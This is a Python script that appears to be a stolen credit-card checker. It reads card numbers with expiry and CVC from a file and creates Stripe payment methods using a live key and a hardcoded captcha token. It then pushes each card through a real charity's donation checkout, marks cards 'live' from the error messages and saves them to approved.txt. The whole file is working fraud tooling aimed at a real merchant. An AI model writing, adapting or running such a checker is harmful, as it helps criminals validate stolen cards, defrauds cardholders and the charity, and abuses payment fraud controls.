try:
	import requests,re,time,json
	from colorama import Fore
	from bs4 import BeautifulSoup
	import pyfiglet
	import os
	from colorama import Back, Fore, Style, init
except ImportError:
	os.system('pip install requests')
	os.system('pip install re')
	os.system('pip install time')
	os.system('pip install colorama')
	os.system('pip install bs4')
	os.system('pip install pyfiglet')


Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
W=Fore.WHITE
L=Fore.BLUE


def print_slow(text, end="\n"):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.0)
    print(end=end)

def center_text(text, width):
    lines = text.split('\n')
    centered_lines = [(line.center(width)) for line in lines]
    return '\n'.join(centered_lines)

if os.name == 'nt':  
    os.system('cls')
else:  
    os.system('clear')
bn=input(('enter ccs file: '))
file=open(bn,"+r")
approved_file = open('approved.txt', 'a')  # Open file to save approved cards
start_num = 0

lino = file.readlines()
lino = [line.rstrip() for line in lino]
for e in lino:
	ccx = e.strip()
	time.sleep(10)
	
	# Add validation to ensure the line has enough parts
	if "|" not in ccx or ccx.count("|") < 3:
		print(f"Invalid format: {ccx}")
		continue
		
	parts = ccx.split("|")
	n = parts[0].strip()
	mm = parts[1].strip()
	yy = parts[2].strip()
	cvc = parts[3].strip()

	headers = {
		'authority': 'api.stripe.com',
		'accept': 'application/json',
		'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://js.stripe.com',
		'referer': 'https://js.stripe.com/',
		'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&billing_details[address][city]=Heathport&billing_details[address][country]=US&billing_details[address][line1]=60269+Cleora+Pine+Apt.+6&billing_details[address][line2]=Cuyahoga+County&billing_details[address][postal_code]=10010&billing_details[address][state]=NY&billing_details[email]=sbxdzrc%40hi2.in&billing_details[name]=Mr+Brooks+Rohan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=bf93b5f4-8e77-402a-adb1-f608d324549cd581f0&muid=ef040de5-bf28-4cd2-b356-454489a1509d441557&sid=ce7bdf50-68fd-433c-93f7-436f1eb6e239983d2a&payment_user_agent=stripe.js%2F2b425ea933%3B+stripe-js-v3%2F2b425ea933%3B+split-card-element&referrer=https%3A%2F%2Fbreastcancerresearch.enthuse.com&time_on_page=126629&ke_live_ftYOjqGtfMkXICnngj1VQh99&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUVZaWkg2UzBSTzFjUGJsV2RrdDZhdE80VGFiY29RQXZZUjY1ZzdzSXptTDdNVnJCMWpEK2VHakVSdHVGclkwRXNGWVFZYk9YbVhDZFUyd1pDNVNoalBObUl6b1ozL1VGVUVCMHZIZjNHQXVXYzdKK1NOMjRoS2x0bE1xTFRuQ1dmZ3NPWnVaMkcwMmdpMW1LV2NBMkhLenJRbkJkazVWOUNUVzREcThNc0hyWDNLZjJyK1Zzek5WeWRZVGVkOVpxMHZwSWNuc1d3L0NxaU9QaUp3cUQ1ZDNvVkdHYVRmOSs4ZjkzeWp4K3FFS0JVNzVpZU1LTkZhTndNRkExTSszZnltK1dkYnp4eGJUbFB5cFdwMks3UlVEMDFvalRHZm1uSHlJTGlFUm9yLzQwRVpGUTRwVlhKODNBT3Ryejk5bFl3TWxOdzdGT0IrSGEzTXU2QlkzMmdwN3RKa3NjdVdkZUVzd0QxRUtpY3F3TTZMT1poZm5mT1NvaEZyS3dlUkVNeHNadGhyMEt1Z3NUdTB1QjRVN2dOM2lGYjBTd2ZUSXJ5bEJLRlN0UU9DSmRHc0JIRm43R1phQzh0cXZZNDFaM3JDRnZxZ2orYlVlUU9qN3FoRXVTTE5ocWxoaHdzWGpFRkl4bitqYVo3MG9DbHo2ZS82TGlWeXVrVDZsb2VlOFk5ckp4R2dQUDU0ZTFvcUorSUlET0ZJeVNWNlIrdlRzdUxCYnc5VE93RHdVMDdpYzVCNnhneFAwS1cvdnE0cDFKMVFubEpSUCtubDFNc2dmdXVuaW5mK3N0dDBtZUtiRjhtRHRjOHBwSFl0YUJpd25qM3MxSzladmdwM0dLK0dBb0x4K25vdGZzTlNZakNUcGM0NWdoMDBmaDArTTlkd0FQbk9FT1RqY1VRZnp4bloxajlxeGtCaUtkQ2pLTHdkcnlEVUJYMjZFZmZKbDZ0WHpBMGk5M2k1VnJtbzNObThUbXh4VEhsemd5MSt5Q0ZoV0xlSGx5YlFOU2hIUGxNWjloWkEzQWY0Y1pLZlVCd3hpWFdCRnkweVI2V2JCMjFHRlNsS285WXo1dEdwZm1YaUt3cEs3VjFiSTZ3VERaQjUwTTZXSDlpbDNpTHNVeWdiK1ZmSTI5cFc2eXpRVTZ1bko0SzFhUGd6aDdZT0dQTk9PUUNENmZna2d1MktPRCtWTVM5cjF6RTNKMXp2TDBLZHl2R1lGem9tNGFFM1Fwa3FvZUFvTHJZMDd1ZnE3Y25DZ2NhQVcrVWcwMHpnc3B2NmVOcGRVUTIyNFZHbUhoc1lnTlZIeVZiQmlTZktheXY0RytRb3ZCcEVKVlAvVnF0MHRxZnVJUTR4OWNaTzArR2lnY1FJN2p0UHhaVCtYeXlEWEF1RUxTekZLc1o5eEZrS21VRzBlTUdzWk9oZUVYZ1VQV1RXRit2YUNXUS9BdytlYU0yYWVjOFFQeEN1OXd0VWd3NG44UnJIcjNWQ0RNaWFuOVVZallJUVdzS2ZpRFZGQmdSckVGdkhlQUhGckc0cmJheGQ3T0IxeUNKc2xkVGx4Rm5GMHdpU2JReHlxNlB3VGc2RSt4Y3djWDhIRW9MWlVibjlVVk5OWnN3N043WUZPMDQ5d3lLRzN3bnhRd0tnSHd6MW1aVEc0amxZNGV3ZG9FQXVRY01vMVc1ZVZBczR5a3MvSlBwcElCa2NIV1BNTmF0RTVpazVWYXZ2YUF2bWRKaHh3NXIzd2VxV3YrRm5EUW5DZUd5cUhxSFU4d0ZuZXdKZVhNOVJ1ZktRMnpkT1dqM0Z3aTRodGZMZWVOUHdUTWxnR0YvL2l5YXpHbzBveDJib2lVVXZZM2U2WkxJV1I1WHdtcnN1VWh3cVlTMnVtazY2T2YwL1grUHp2S21zNXVyMk5EZk05cmdRZjhVdWhKZjViNXF2NXRGRE5jWFFpUUsvSzI2S20yV0tETHZxR21ZNUpiS0Z1K3A4VE9DZWV3eFA1QnRFUHNHb1FGRU8xMVc3VHc5bWc0S0RYbUd0NTMrOHExQnZJWUlhbGNLeU80Z05pZ3U3M0dBUDFGai9QTGZjWWFGMXJpQjRtNVNtTzdJalBpNWsrcXZCMWVzc1dGVCttUENyVSt4ZGJNUW5MOWZadzdLdDdyTnlCd3JKdXIrWTdacHhLakdJSEdQc045TTJyWUJ0WHlTYU1MRGNqeld5Tmd0ck84Y3NyVXg5SHZXVEVPMExwZXNTd3hmek94RzZoYytOdFdFM1d2NzFETXZNUUJ2dTJUdENYWVdYRVgrS0FtaTRnMGw2d3V1OXRFM1FySVJtWWE5R0wwNkpacDg5QkpmOW5BU3ozaXFZOGJ4bEN0Ly9ESGg4NHV0SFVtcXNUdXBDQ2wycGN4d1dvRHR3bkdVNm5YQjJVNEF3MHg5T2t2NFh4dDFzSFZQMDNUWVExa2hxMzFYQVdJaUMvK21TUHh5TWpoOEVNdzA4UUlQeTdwOTVVZEZBNmI3UW9qZXRjZ2pPMHBPdXZJNkZUSitYYWJZTnhCYzVQYVMwU01tQ1RjbE1zQ0pFWHlWeHZ0QmxvUzVaSURsbXAvNDBoSG5CUmR5S3NZNXRsUzFWVHdHbzVLYWJzU2F4TFhEcUJCREx1RDY2RlZvVy9TQmRIaVBlNFRzdFdJTHV6NHorOWN1SWhWS3NqdzVLNW90d1ZxQThyUXl1dW9sQUYxb0gvUURrWkZISzJzRFQ4YzBWQ2FnR2hqQUtOZHd4NW9jWTlEVmVXSnVjajJ2amtYNXlreGVLTEVNRzJaRzI0PSIsImV4cCI6MTc0NzU1NTI3MCwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiI1MDEzNmI3IiwicGQiOjAsImNkYXRhIjoiUmpYZCtPSW9wUllhcy8yUVdzL2REUDMxWFdCYW93cTZrVVR0QlpkWUtBUUpneEdMOC9FbFRzZnZQbjgyQWp0ZTRyT3MvTG9QMzFGbW95QVRJOW8zelVwZ1BWdHNmSVhDWXJhODVQY2dpbTVIWTk2cGJuZG15a3BWc3Z4TEF5Wi9UWEJ0MnhyUnJKS3lUS29BRUM4Z3VmOTBkRVhyWVZuU3VFZXkzQmJtSHVHUkZ5OHM4ajRLejBQS2hSbnhrUHM4T1YwdjhQU0tYZUVUdHVJUSJ9.tkvFUaCs7qALz6IT2SyEmcqtr5cI0OMz6LAZuy2lwIg'

	try:
		response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
		
		if not 'id' in response.json():
			print('ERROR CARD')
			continue
		else:
			payment_id = response.json()['id']  # Changed variable name from 'id' to avoid conflicts
	except Exception as e:
		print(f"Error creating payment method: {e}")
		continue
	
	headers = {
		'authority': 'breastcancerresearch.enthuse.com',
		'accept': 'application/json, text/plain, */*',
		'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
		'content-type': 'application/json;charset=UTF-8',
		'origin': 'https://breastcancerresearch.enthuse.com',
		'referer': 'https://breastcancerresearch.enthuse.com/cp/5353d/fundraiser?&key=9eddf8c7-5b62-4f61-bcb9-94fa2add96f5',
		'request-id': '|8fb735acc83a44079c4922a318a100fa.f4562349531b4ee2',
		'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'traceparent': '00-8fb735acc83a44079c4922a318a100fa-f4562349531b4ee2-01',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}

	json_data = {
		'key': '9eddf8c7-5b62-4f61-bcb9-94fa2add96f5',
		'paymentMethodId': str(payment_id),  # Ensure it's a string
		'threeDSecureSupported': True,
		'stripeConnectedAccountId': 'acct_1LsP7SS6jM7JbDr4',
		'cardCountryCode': 'IT',
	}

	try:
		response = requests.post(
			'https://breastcancerresearch.enthuse.com/checkoutstate/pay/stripe',
			headers=headers,
			json=json_data,
		)
		print(B+ccx ,' ➜ ', response.text)
	except Exception as e:
		print(f"Error making payment request: {e}")
		continue
	
	# Check for approved cards based on the response
	response_text = response.text.lower()
	is_approved = False
	reason = ""
	
	try:
		response_json = json.loads(response.text)
		
		# Check for direct success
		if ('success' in response_json and response_json['success']) or ('paid' in response_json and response_json['paid']):
			is_approved = True
			reason = "Card Approved ✅"
		
		# Check for specific error types that indicate valid cards
		elif 'error' in response_json or 'errors' in response_json:
			error_msg = ""
			if 'error' in response_json:
				error_msg = str(response_json['error'].get('message', '')).lower()
			elif 'errors' in response_json:
				error_msg = str(response_json['errors']).lower()
			
			# CCN Live Check
			if 'security code is incorrect' in error_msg or 'security code is invalid' in error_msg or 'cvv' in error_msg:
				is_approved = True
				reason = "CCN LIVE - Security code incorrect"
			
			# Insufficient Funds Check
			elif 'insufficient funds' in error_msg or 'insufficient_funds' in error_msg:
				is_approved = True
				reason = "CVV LIVE - Insufficient Funds"
			
			# AVS Check
			elif 'avs' in error_msg or 'address_verification' in error_msg or 'incorrect_address' in error_msg:
				is_approved = True
				reason = "AVS LIVE - Address Verification Failed"
			
			# 3D Secure Check
			elif '3d' in error_msg or 'three_d_secure' in error_msg or 'authentication_required' in error_msg:
				is_approved = True
				reason = "3D SECURE - Authentication Required"
	except:
		# Fallback to text-based parsing if JSON parsing fails
		if 'security code is incorrect' in response_text or 'security code is invalid' in response_text or 'cvv' in response_text:
			is_approved = True
			reason = "CCN LIVE - Security code incorrect"
		elif 'insufficient funds' in response_text or 'insufficient_funds' in response_text:
			is_approved = True
			reason = "CVV LIVE - Insufficient Funds"
		elif 'avs' in response_text or 'address_verification' in response_text or 'incorrect_address' in response_text:
			is_approved = True
			reason = "AVS LIVE - Address Verification Failed"
		elif '3d' in response_text or 'three_d_secure' in response_text or 'authentication_required' in response_text:
			is_approved = True
			reason = "3D SECURE - Authentication Required"
	
	# Save approved cards to file
	if is_approved:
		approved_file.write(f"{ccx} | {reason}\n")
		approved_file.flush()  # Ensure it's written immediately
		print(F+"SAVED TO approved.txt: "+ccx+" | "+reason)

# Close files when done
file.close()
approved_file.close()
